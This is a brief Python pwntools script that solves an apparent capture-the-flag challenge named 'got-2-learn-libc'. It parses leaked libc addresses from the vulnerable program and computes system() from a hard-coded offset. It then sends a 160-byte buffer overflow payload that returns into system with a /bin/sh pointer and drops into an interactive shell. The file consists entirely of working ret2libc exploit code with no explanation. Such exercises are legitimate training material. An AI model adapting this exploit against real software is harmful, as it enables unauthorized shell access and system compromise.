#!/usr/bin/env python

import pwn

puts = 0xf7e73140
system = 0xf7e4e940

gdb_offset = puts - system

elf = pwn.ELF('/problems/got-2-learn-libc_4_526cc290dde8d914a30538d3d0ac4ef1/vuln')
p = elf.process()

full_prompt = p.recv()
puts_prompt = int(str(full_prompt).split('puts: ' )[1].split('fflush')[0].replace("\n", "").replace(" ",""), 16)
bin_sh = int(str(full_prompt).split('useful_string: ' )[1].split('Enter')[0].replace("\n", "").replace(" ",""), 16)
print(puts_prompt)
print(bin_sh)
system = puts_prompt - gdb_offset

print("Calculated system = " + hex(system))
payload = "A" * 160
payload += pwn.p32(system)
payload += 'RETN'
payload += pwn.p32(bin_sh)

p.send(payload)
p.interactive()
